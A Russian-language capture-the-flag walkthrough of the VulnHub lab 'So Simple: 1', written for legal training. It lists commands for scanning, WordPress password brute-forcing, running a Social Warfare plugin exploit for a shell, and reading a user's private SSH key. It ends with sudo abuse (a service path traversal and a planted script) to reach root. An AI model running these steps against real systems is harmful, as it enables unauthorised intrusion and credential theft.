# So Simple: 1

> Полное прохождение лаборатории. Материал содержит спойлеры и предназначен только для легальной учебной практики.

**Лаборатория:** [открыть машину на VulnHub](https://www.vulnhub.com/entry/so-simple-1,515/)

## Ход работы

### 1. Подготовка и обнаружение машины

Скачаем машину с сайта VulnHub и запустим её. Для дальнейшей работы целевая и рабочая машины должны находиться в одной сети. В данном случае использовался сетевой режим моста.

Сначала проверим IP-адрес рабочей машины:

```bash
ip a
```

![Скриншот 1 — IP-адрес рабочей машины](./media/image1.png)

Чтобы узнать IP-адрес So Simple: 1, запустим Netdiscover для нашей подсети:

```bash
sudo netdiscover -r 192.168.1.0/24
```

![Скриншот 2 — запуск Netdiscover](./media/image2.png)

В списке активных хостов целевая машина находится под номером 3:

![Скриншот 3 — результат Netdiscover](./media/image3.png)

Запущенная машина также показывает свой адрес на экране входа:

![Скриншот 4 — IP-адрес на экране целевой машины](./media/image4.png)

### 2. Сканирование портов

Запустим сканирование Nmap:

```bash
nmap -A 192.168.1.109
```

![Скриншот 5 — результат Nmap](./media/image5.png)

Открыты два порта: TCP 22 с SSH и TCP 80 с HTTP. Данных для входа по SSH пока нет, поэтому перейдём к веб-странице на порту 80:

![Скриншот 6 — веб-страница So Simple](./media/image6.png)

### 3. Поиск веб-директорий

Запустим Gobuster для перебора директорий:

```bash
gobuster dir -u http://192.168.1.109 -w /usr/share/wordlists/dirb/common.txt
```

![Скриншот 7 — результат Gobuster](./media/image7.png)

Обнаружена директория `/wordpress`. Перейдём по ней:

![Скриншот 8 — сайт WordPress](./media/image8.png)

### 4. Перечисление пользователей WordPress

Сайт работает на WordPress. Используем WPScan для перечисления пользователей:

![Скриншот 9 — пользователи admin и max](./media/image9.png)

Найдены пользователи `admin` и `max`. Попробуем подобрать пароль пользователя `max` с помощью WPScan и словаря `rockyou.txt`:

```bash
sudo wpscan --url http://ip_adress/wordpress -U max -P /usr/share/wordlists/rockyou.txt
```

![Скриншот 10 — найденный пароль пользователя max](./media/image10.png)

Пароль найден: `max:opensesame`.

Перейдём на страницу входа `http://ip_adress/wordpress/wp-login.php`:

![Скриншот 11 — форма входа WordPress](./media/image11.png)

Используем найденные реквизиты. Вход в учётную запись `max` выполнен успешно:

![Скриншот 12 — панель WordPress пользователя max](./media/image12.png)

### 5. Поиск уязвимого плагина

Получить оболочку через доступные функции сайта не удалось, поэтому вернёмся к результатам WPScan и подробнее изучим установленные компоненты:

```bash
sudo wpscan --url http://192.168.1.105/wordpress --enumerate
```

WPScan показывает несколько устаревших плагинов:

![Скриншот 13 — плагин Simple Cart Solution](./media/image13.png)

![Скриншот 14 — плагин Social Warfare](./media/image14.png)

На Exploit-DB не нашлось подходящего результата для Simple Cart Solution, но был найден эксплойт для Social Warfare:

![Скриншот 15 — результаты поиска Social Warfare на Exploit-DB](./media/image15.png)

Установлена версия Social Warfare 3.5.0:

![Скриншот 16 — версия Social Warfare](./media/image16.png)

### 6. Получение первоначальной оболочки

Скачаем найденный эксплойт и откроем его для редактирования:

![Скриншот 17 — страница эксплойта EDB-ID 52346](./media/image17.png)

В эксплойте укажем IP-адрес рабочей машины и `TARGET_URL`, ведущий к каталогу WordPress на целевой машине. Сохраним изменения и запустим файл:

```bash
python3 52346.py
```

![Скриншот 18 — оболочка www-data](./media/image18.png)

Эксплойт сработал, и была получена оболочка от имени `www-data`. Начнём изучать файловую систему. В каталоге WordPress находится файл `secretkey.txt`:

```bash
cat secretkey.txt
```

![Скриншот 19 — содержимое secretkey.txt](./media/image19.png)

Строка декодируется из Base64 в сообщение `Hahahahaha, it's not that easy !!!`:

![Скриншот 20 — декодирование secretkey.txt](./media/image20.png)

Перейдём дальше по каталогам. В папке `this` полезных данных не найдено:

![Скриншот 21 — содержимое каталога this](./media/image21.png)

Файл `user2.txt` прочитать не удаётся из-за отсутствия прав:

![Скриншот 22 — отказ в доступе к user2.txt](./media/image22.png)

В домашнем каталоге `max` доступны `personal.txt`, `this` и `user.txt`, но флаг `user.txt` также закрыт для `www-data`:

![Скриншот 23 — файлы в каталоге пользователя max](./media/image23.png)

### 7. Поиск SSH-ключа пользователя max

Отобразим скрытые файлы в домашнем каталоге `max`. В директории `.ssh` находится файл `id_rsa`:

```bash
ls -la
cd .ssh
ls -l
cat id_rsa
```

![Скриншот 24 — содержимое каталога .ssh](./media/image24.png)

Приватный ключ отображён в терминале:

![Скриншот 25 — приватный SSH-ключ пользователя max](./media/image25.png)

Скопируем ключ на рабочую машину и сохраним как `max_id_rsa`:

![Скриншот 26 — файл max_id_rsa на рабочей машине](./media/image26.png)

### 8. SSH-доступ под пользователем max

Попробуем подключиться к целевой машине с найденным ключом:

```bash
ssh max@192.168.1.107 -i max_id_rsa
```

SSH отклоняет ключ, потому что файл `max_id_rsa` доступен для чтения другим пользователям:

![Скриншот 27 — ошибка прав доступа к приватному ключу](./media/image27.png)

Ограничим права на файл и повторим подключение:

```bash
chmod 600 max_id_rsa
ssh max@192.168.1.107 -i max_id_rsa
```

![Скриншот 28 — успешное SSH-подключение](./media/image28.png)

Соединение установлено от имени `max`. Прочитаем первый флаг:

```bash
cat user.txt
```

![Скриншот 29 — первый пользовательский флаг](./media/image29.png)

### 9. Повышение привилегий от max до steven

Команда `sudo -l` показывает, какие команды текущий пользователь может выполнять через `sudo`. Пользователь `max` может без пароля запускать `/usr/sbin/service` от имени `steven`. Используем это разрешение:

```bash
sudo -l
sudo -u steven service ../../bin/sh
whoami
```

![Скриншот 30 — переход к пользователю steven](./media/image30.png)

Теперь можно прочитать второй пользовательский флаг:

```bash
cat user2.txt
```

![Скриншот 31 — второй пользовательский флаг](./media/image31.png)

### 10. Повышение привилегий от steven до root

Снова посмотрим вывод `sudo -l`, теперь уже от имени `steven`:

```bash
sudo -l
```

![Скриншот 32 — разрешения sudo пользователя steven](./media/image32.png)

Пользователь `steven` может без пароля запускать `/opt/tools/server-health.sh` от имени root. Однако каталога `/opt/tools` и файла `server-health.sh` нет:

```bash
cd /opt
pwd
ls -la
```

![Скриншот 33 — содержимое каталога opt](./media/image33.png)

Создадим отсутствующий каталог:

```bash
mkdir tools
cd tools
pwd
```

![Скриншот 34 — создание каталога tools](./media/image34.png)

Создадим `server-health.sh` со следующим содержимым:

```bash
#!/bin/bash
bash
```

![Скриншот 35 — содержимое server-health.sh](./media/image35.png)

Добавим файлу право на выполнение:

```bash
chmod +x server-health.sh
ls -l
```

![Скриншот 36 — права файла server-health.sh](./media/image36.png)

Запустим разрешённый сценарий от имени root и проверим текущего пользователя:

```bash
sudo -u root /opt/tools/server-health.sh
whoami
```

![Скриншот 37 — оболочка root](./media/image37.png)

### 11. Получение root-флага

Перейдём в домашний каталог root и прочитаем флаг:

```bash
cd /root
ls -l
cat flag.txt
```

![Скриншот 38 — root-флаг](./media/image38.png)

На этом прохождение машины завершено.
